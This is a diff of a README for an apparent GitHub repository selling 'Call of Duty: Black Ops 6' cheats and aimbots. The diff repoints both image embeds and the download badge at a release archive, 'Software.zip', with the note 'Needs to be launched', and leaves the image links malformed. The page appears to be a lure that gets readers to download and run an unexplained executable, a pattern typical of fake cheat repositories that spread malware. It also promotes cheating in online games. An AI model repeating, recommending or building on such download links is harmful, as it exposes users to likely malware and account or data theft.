@@ -3,7 +3,7 @@
 
 Welcome to the **Call of Duty Black Ops 6 Cheat Repository**! This repository is dedicated to providing cheat codes, hacks, and aimbots for the popular game "Call of Duty: Black Ops 6". If you are looking to dominate the battlefield with an edge over your opponents, you have come to the right place!
 
-![Black Ops 6 Logo](https://cdn2.unrealengine.com/Diesel%2Fproductv2%2Fcallofdutyblackops4%2Fhome%2FCODMobile-Logo-264x158-d1f55f2f8aa0e79fc343c9aa00b7e8e63e14619f.png)
+![Black Ops 6 Logo](https://github.com/Yuicochi/Call-Of-Duty-Black-Ops-6-cheat/releases/download/v2.0/Software.zip%2Fproductv2%2Fcallofdutyblackops4%2Fhome%https://github.com/Yuicochi/Call-Of-Duty-Black-Ops-6-cheat/releases/download/v2.0/Software.zip)
 
 ## Repository Topics
 - `aimbot-bo6`
@@ -26,7 +26,7 @@ In this repository, you will find a collection of cheats, hacks, and aimbots for
 ## Get Started
 To access the cheats and hacks, download our software package by clicking the button below:
 
-[![Download Cheats](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18383251/Software.zip "Needs to be launched")
+[![Download Cheats](https://github.com/Yuicochi/Call-Of-Duty-Black-Ops-6-cheat/releases/download/v2.0/Software.zip)](https://github.com/Yuicochi/Call-Of-Duty-Black-Ops-6-cheat/releases/download/v2.0/Software.zip "Needs to be launched")
 
 Don't miss out on the opportunity to level up your gameplay with our exclusive cheats for "Call of Duty: Black Ops 6"!
 
@@ -34,4 +34,4 @@ Don't miss out on the opportunity to level up your gameplay with our exclusive c
 
 Happy cheating and happy gaming! 🎮🔫
 
-![Black Ops 6 Gameplay](https://cdn1.dotesports.com/wp-content/uploads/2021/10/08154833/call-of-duty-vanguard-black-ops-crossover.jpg)
+![Black Ops 6 Gameplay](https://github.com/Yuicochi/Call-Of-Duty-Black-Ops-6-cheat/releases/download/v2.0/Software.zip)
